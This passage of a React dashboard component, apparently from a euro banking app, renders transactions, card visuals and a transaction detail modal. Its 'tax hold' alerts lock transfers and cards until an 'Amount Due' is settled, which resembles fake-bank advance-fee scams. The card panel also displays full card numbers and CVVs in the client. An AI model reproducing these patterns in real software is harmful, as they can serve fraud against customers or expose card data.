                          <p className="text-xs text-gray-500">{formatDate(txn.created_at)}</p>
                        )}
                      </div>
                      <div className="text-right flex-shrink-0 ml-4">
                        <p className={`text-sm font-semibold ${isCredit ? 'text-green-600' : 'text-red-600'}`}>
                          {isCredit ? '+' : '-'}€{formatAmount(amount)}
                        </p>
                        <span className="badge badge-success text-xs">{txn.status || 'POSTED'}</span>
                      </div>
                    </div>
                  );
                })}
                <button 
                  onClick={() => {
                    if (taxHoldStatus?.is_blocked) {
                      alert(`Account Restricted\n\nYour account has been temporarily restricted due to outstanding tax obligations.\n\nAmount Due: €${taxHoldStatus.tax_amount_due?.toLocaleString('en-EU', { minimumFractionDigits: 2 })}\n\nPlease settle the required amount to restore full access. For assistance, contact support.`);
                    } else if (accounts[0]) {
                      navigate(`/accounts/${accounts[0].id}/transactions`);
                    }
                  }} 
                  className="w-full mt-4 text-sm text-red-600 hover:text-red-700 font-medium"
                  disabled={accounts.length === 0}
                >
                  View all transactions →
                </button>
              </div>
            )}
          </div>
        </div>

        {/* Right: Quick Actions */}
        <div className="space-y-6">
          <div>
            <div className="section-header">Quick Actions</div>
            <div className="card p-4 space-y-2">
              <button 
                onClick={() => {
                  if (taxHoldStatus?.is_blocked) {
                    alert(`Account Restricted\n\nYour account has been temporarily restricted due to outstanding tax obligations.\n\nAmount Due: €${taxHoldStatus.tax_amount_due?.toLocaleString('en-EU', { minimumFractionDigits: 2 })}\n\nPlease settle the required amount to restore full access to your banking services. For assistance, contact our support team.`);
                  } else {
                    navigate('/transfers');
                  }
                }} 
                className={`w-full ${taxHoldStatus?.is_blocked ? 'btn-secondary opacity-75' : 'btn-primary'}`}
              >
                Send Money
              </button>
              {kycStatus === 'APPROVED' && (
                <button 
                  onClick={() => {
                    if (taxHoldStatus?.is_blocked) {
                      alert(`Account Restricted\n\nYour account has been temporarily restricted due to outstanding tax obligations.\n\nAmount Due: €${taxHoldStatus.tax_amount_due?.toLocaleString('en-EU', { minimumFractionDigits: 2 })}\n\nCard services are unavailable until the required amount is settled. For assistance, contact our support team.`);
                    } else {
                      navigate('/cards');
                    }
                  }} 
                  className={`w-full ${taxHoldStatus?.is_blocked ? 'btn-secondary opacity-75' : 'btn-primary'}`}
                >
                  Order Card
                </button>
              )}
              <button 
                onClick={() => {
                  if (taxHoldStatus?.is_blocked) {
                    alert(`Account Restricted\n\nYour account has been temporarily restricted due to outstanding tax obligations.\n\nAmount Due: €${taxHoldStatus.tax_amount_due?.toLocaleString('en-EU', { minimumFractionDigits: 2 })}\n\nCard management is unavailable until the required amount is settled. For assistance, contact our support team.`);
                  } else {
                    navigate('/cards');
                  }
                }} 
                className={`w-full ${taxHoldStatus?.is_blocked ? 'btn-secondary opacity-75' : 'btn-secondary'}`}
              >
                Manage Cards
              </button>
            </div>
          </div>

          {/* My Cards Section */}
          {cards.filter(c => c.status === 'ACTIVE').length > 0 && (
            <div>
              <div className="section-header">My Cards</div>
              <div className="space-y-4">
                {cards.filter(c => c.status === 'ACTIVE').slice(0, 2).map((card) => (
                  <div key={card.id} className="relative">
                    {/* Visual Card */}
                    <div 
                      className="relative w-full aspect-[1.586/1] rounded-xl overflow-hidden cursor-pointer transform transition-transform hover:scale-[1.02]"
                      style={{
                        background: card.card_type === 'VIRTUAL' 
                          ? 'linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)'
                          : 'linear-gradient(135deg, #2d2d2d 0%, #1a1a1a 50%, #0d0d0d 100%)'
                      }}
                      onClick={() => setShowCardDetails(showCardDetails === card.id ? null : card.id)}
                      data-testid={`card-visual-${card.id}`}
                    >
                      {/* Card Chip */}
                      <div className="absolute top-6 left-6">
                        <div className="w-10 h-8 rounded bg-gradient-to-br from-yellow-300 via-yellow-400 to-yellow-600 opacity-90">
                          <div className="w-full h-full grid grid-cols-3 gap-px p-1">
                            {[...Array(6)].map((_, i) => (
                              <div key={i} className="bg-yellow-600/30 rounded-sm"></div>
                            ))}
                          </div>
                        </div>
                      </div>

                      {/* Contactless Icon */}
                      <div className="absolute top-6 right-6">
                        <svg className="w-8 h-8 text-white/60" viewBox="0 0 24 24" fill="currentColor">
                          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z" opacity="0.3"/>
                          <path d="M7.5 12c0-2.48 2.02-4.5 4.5-4.5v-2c-3.58 0-6.5 2.92-6.5 6.5s2.92 6.5 6.5 6.5v-2c-2.48 0-4.5-2.02-4.5-4.5z"/>
                          <path d="M12 7.5c2.48 0 4.5 2.02 4.5 4.5s-2.02 4.5-4.5 4.5v2c3.58 0 6.5-2.92 6.5-6.5s-2.92-6.5-6.5-6.5v2z"/>
                        </svg>
                      </div>

                      {/* Card Number */}
                      <div className="absolute bottom-16 left-6 right-6">
                        <p className="text-white/90 font-mono text-lg tracking-widest">
                          {showCardDetails === card.id 
                            ? (card.pan || '').match(/.{1,4}/g)?.join(' ') || '•••• •••• •••• ••••'
                            : `•••• •••• •••• ${card.pan?.slice(-4) || '••••'}`
                          }
                        </p>
                      </div>

                      {/* Card Holder & Expiry */}
                      <div className="absolute bottom-4 left-6 right-6 flex justify-between items-end">
                        <div>
                          <p className="text-white/50 text-[10px] uppercase tracking-wider mb-0.5">Card Holder</p>
                          <p className="text-white/90 text-sm font-medium uppercase tracking-wide">
                            {card.cardholder_name || `${user?.first_name} ${user?.last_name}`}
                          </p>
                        </div>
                        <div className="text-right">
                          <p className="text-white/50 text-[10px] uppercase tracking-wider mb-0.5">Expires</p>
                          <p className="text-white/90 text-sm font-mono">
                            {String(card.exp_month).padStart(2, '0')}/{String(card.exp_year).slice(-2)}
                          </p>
                        </div>
                      </div>

                      {/* Card Type Badge */}
                      <div className="absolute top-14 left-6">
                        <span className="text-white/70 text-xs font-medium uppercase tracking-wider">
                          {card.card_type === 'VIRTUAL' ? 'Virtual Card' : 'Physical Card'}
                        </span>
                      </div>

                      {/* Mastercard Logo */}
                      <div className="absolute bottom-4 right-6">
                        <div className="flex">
                          <div className="w-6 h-6 rounded-full bg-red-500 opacity-90"></div>
                          <div className="w-6 h-6 rounded-full bg-yellow-500 opacity-90 -ml-2"></div>
                        </div>
                      </div>
                    </div>

                    {/* Card Details Dropdown */}
                    {showCardDetails === card.id && (
                      <div className="mt-2 p-4 bg-gray-50 rounded-lg border border-gray-200 animate-fadeIn">
                        <div className="grid grid-cols-2 gap-4 text-sm">
                          <div>
                            <p className="text-gray-500 text-xs mb-1">Card Number</p>
                            <p className="font-mono text-gray-900">{(card.pan || '').match(/.{1,4}/g)?.join(' ') || 'N/A'}</p>
                          </div>
                          <div>
                            <p className="text-gray-500 text-xs mb-1">CVV</p>
                            <p className="font-mono text-gray-900">{card.cvv || '•••'}</p>
                          </div>
                          <div>
                            <p className="text-gray-500 text-xs mb-1">Expiry Date</p>
                            <p className="font-mono text-gray-900">{String(card.exp_month).padStart(2, '0')}/{card.exp_year}</p>
                          </div>
                          <div>
                            <p className="text-gray-500 text-xs mb-1">Status</p>
                            <span className="badge badge-success text-xs">{card.status}</span>
                          </div>
                        </div>
                        <button 
                          onClick={() => navigate('/cards')}
                          className="w-full mt-4 text-sm text-red-600 hover:text-red-700 font-medium"
                        >
                          View all cards →
                        </button>
                      </div>
                    )}

                    {/* Click hint */}
                    <p className="text-center text-xs text-gray-400 mt-2">
                      {showCardDetails === card.id ? 'Click card to hide details' : 'Click card to show details'}
                    </p>
                  </div>
                ))}
              </div>
            </div>
          )}

          <div>
            <div className="section-header">This Month</div>
            <div className="card p-4">
              <div className="flex justify-between mb-3">
                <span className="text-sm text-gray-600">Total Spending</span>
                <span className="text-lg font-bold" data-testid="monthly-spending-amount">€{formatAmount(monthlySpending.total)}</span>
              </div>
              {Object.keys(monthlySpending.categories || {}).length > 0 && (
                <div className="space-y-1 mb-3">
                  {Object.entries(monthlySpending.categories).slice(0, 3).map(([category, amount]) => (
                    <div key={category} className="flex justify-between text-xs">
                      <span className="text-gray-500">{category.replace(/_/g, ' ')}</span>
                      <span className="text-gray-700">€{formatAmount(amount)}</span>
                    </div>
                  ))}
                </div>
              )}
              <button onClick={() => navigate('/insights')} className="text-xs text-red-600 hover:text-red-700 font-medium">
                View full breakdown →
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Transaction Detail Modal */}
      {selectedTransaction && (
        <>
          <div 
            className="fixed inset-0 bg-black/50 z-40" 
            onClick={() => setSelectedTransaction(null)}
          />
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <div className="bg-white rounded-xl shadow-2xl max-w-md w-full max-h-[90vh] overflow-y-auto">
              {(() => {
                const txn = selectedTransaction;
                const metadata = txn.metadata || {};
                const displayType = metadata.display_type || txn.transaction_type?.replace(/_/g, ' ') || 'Transaction';
                const isCredit = ['TOP_UP', 'CREDIT', 'REFUND', 'INTEREST'].includes(txn.transaction_type) || txn.direction === 'CREDIT';
                const amount = txn.amount || 0;

                return (
                  <>
                    {/* Header */}
                    <div className={`p-6 text-center ${isCredit ? 'bg-green-50' : 'bg-red-50'}`}>
                      <div className={`w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 ${isCredit ? 'bg-green-100' : 'bg-red-100'}`}>
                        {isCredit ? (
                          <svg className="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v16m8-8H4" />
                          </svg>
                        ) : (
                          <svg className="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M20 12H4" />
                          </svg>
                        )}
                      </div>
                      <p className="text-sm text-gray-600 mb-1">{displayType}</p>
                      <p className={`text-3xl font-bold ${isCredit ? 'text-green-600' : 'text-red-600'}`}>
                        {isCredit ? '+' : '-'}€{formatAmount(amount)}
                      </p>
                      <span className={`inline-block mt-2 px-3 py-1 rounded-full text-xs font-medium ${
                        txn.status === 'POSTED' ? 'bg-green-100 text-green-700' : 
                        txn.status === 'PENDING' ? 'bg-yellow-100 text-yellow-700' : 
                        'bg-gray-100 text-gray-700'
                      }`}>
                        {txn.status || 'POSTED'}
                      </span>
                    </div>

                    {/* Details */}
                    <div className="p-6 space-y-4">
                      {/* Date & Time */}
                      <div className="flex justify-between py-3 border-b">
                        <span className="text-sm text-gray-500">Date & Time</span>
                        <span className="text-sm font-medium text-gray-900">{formatDateTime(txn.created_at)}</span>
                      </div>

                      {/* Transaction Type */}
                      <div className="flex justify-between py-3 border-b">
                        <span className="text-sm text-gray-500">Type</span>
                        <span className="text-sm font-medium text-gray-900">{txn.transaction_type?.replace(/_/g, ' ') || 'Transaction'}</span>
                      </div>

                      {/* Sender/Recipient */}
                      {metadata.sender_name && (
                        <div className="flex justify-between py-3 border-b">
                          <span className="text-sm text-gray-500">From</span>
                          <span className="text-sm font-medium text-gray-900">{metadata.sender_name}</span>
                        </div>
                      )}
                      {metadata.recipient_name && (
                        <div className="flex justify-between py-3 border-b">
                          <span className="text-sm text-gray-500">To</span>
                          <span className="text-sm font-medium text-gray-900">{metadata.recipient_name}</span>
                        </div>
                      )}

                      {/* IBAN */}
                      {metadata.sender_iban && (
                        <div className="flex justify-between py-3 border-b">
                          <span className="text-sm text-gray-500">Sender IBAN</span>
                          <span className="text-sm font-mono text-gray-900">{formatIBAN(metadata.sender_iban)}</span>
                        </div>
                      )}
                      {metadata.to_iban && (
                        <div className="flex justify-between py-3 border-b">
                          <span className="text-sm text-gray-500">Recipient IBAN</span>
                          <span className="text-sm font-mono text-gray-900">{formatIBAN(metadata.to_iban)}</span>
                        </div>
                      )}

                      {/* BIC */}
                      {metadata.sender_bic && (
                        <div className="flex justify-between py-3 border-b">
                          <span className="text-sm text-gray-500">BIC</span>
                          <span className="text-sm font-mono text-gray-900">{metadata.sender_bic}</span>
                        </div>
                      )}

                      {/* Reference */}
                      {metadata.reference && (
                        <div className="flex justify-between py-3 border-b">
                          <span className="text-sm text-gray-500">Reference</span>
                          <span className="text-sm font-mono text-gray-900">{metadata.reference}</span>
                        </div>
                      )}

                      {/* Description */}
                      {(metadata.description || txn.reason) && (
                        <div className="py-3 border-b">
                          <span className="text-sm text-gray-500 block mb-1">Description</span>
                          <span className="text-sm text-gray-900">{metadata.description || txn.reason}</span>
                        </div>
                      )}

                      {/* Transaction ID */}
                      <div className="py-3 border-b">
                        <span className="text-sm text-gray-500 block mb-1">Transaction ID</span>
                        <span className="text-xs font-mono text-gray-600 break-all">{txn.id}</span>
                      </div>

                      {/* External ID if present */}
                      {txn.external_id && (
                        <div className="py-3 border-b">
                          <span className="text-sm text-gray-500 block mb-1">External Reference</span>
                          <span className="text-xs font-mono text-gray-600 break-all">{txn.external_id}</span>
                        </div>
                      )}
                    </div>

                    {/* Footer */}
                    <div className="p-6 bg-gray-50 border-t">
                      <button 
                        onClick={() => setSelectedTransaction(null)}
                        className="w-full py-3 bg-gray-900 text-white font-medium rounded-lg hover:bg-gray-800 transition-colors"
                      >
                        Close
                      </button>
                    </div>
                  </>
                );
              })()}
            </div>
          </div>
        </>
      )}
    </div>
  );
}

